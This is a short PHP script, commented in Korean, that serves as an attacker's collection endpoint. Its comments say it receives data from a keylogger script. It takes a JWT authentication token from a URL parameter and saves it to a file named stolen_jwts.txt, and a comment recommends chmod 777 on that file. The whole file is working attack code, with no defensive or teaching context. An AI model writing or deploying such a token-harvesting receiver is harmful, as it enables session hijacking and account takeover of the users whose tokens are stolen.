<?php
// 키로거 스크립트로 받아 온 정보
$account = $_GET['jwt'];

// 쓰기 권한 부여 필수 ex) chmod 777 "stolen_jwts.txt"
$save_file = fopen("/home/bitnami/htdocs/stolen_jwts.txt", "w");
fwrite($save_file, $account);
fclose($save_file);
?>
